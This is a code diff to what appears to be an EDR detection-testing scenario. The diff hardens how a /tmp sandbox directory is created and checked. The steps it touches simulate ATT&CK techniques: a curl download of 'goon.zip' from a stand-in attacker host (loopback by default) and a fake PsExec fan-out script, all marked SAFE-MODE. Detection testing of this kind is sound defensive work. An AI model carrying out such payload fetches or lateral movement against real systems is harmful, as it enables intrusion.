@@ -99,7 +99,7 @@ steps:
     name: "T1570 — archive download from attacker S3 over HTTPS spawns a never-before-seen tunneler"
     command: |
       set -e
-      WORK=/tmp/cortexsim_edr015; mkdir -p "$WORK"
+      WORK=/tmp/cortexsim_edr015; rm -rf /tmp/cortexsim_edr015 && mkdir -m 700 /tmp/cortexsim_edr015 || { echo "sandbox /tmp/cortexsim_edr015 could not be created fresh: something else is at that path" >&2; exit 1; }
       # HTTPS archive fetch (loopback SAFE-MODE; benign marker if unreachable)
       curl -s --max-time 5 "https://${HTTPS_HOST:-127.0.0.1}/goon.zip" -o "$WORK/goon.zip" 2>/dev/null \
         || echo 'SAFE-MODE goon.zip marker' > "$WORK/goon.zip"
@@ -153,7 +153,7 @@ steps:
   - id: step-03
     name: "T1021.002 — PsExec / RDP remote-service fan-out to internal peers"
     command: |
-      WORK=/tmp/cortexsim_edr015; mkdir -p "$WORK"
+      WORK=/tmp/cortexsim_edr015; [ "$(stat -c %F:%u:%a /tmp/cortexsim_edr015 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim_edr015 is missing or not ours: step-01 did not complete" >&2; exit 1; }
       printf '#!/bin/sh\necho cortexsim-edr015-psexec-fanout-safe-marker "$1"\n' > "$WORK/psexec.exe"
       chmod +x "$WORK/psexec.exe"
       # fan out toward >= 2 loopback/lab peers (SAFE-MODE, no real SMB/RDP)
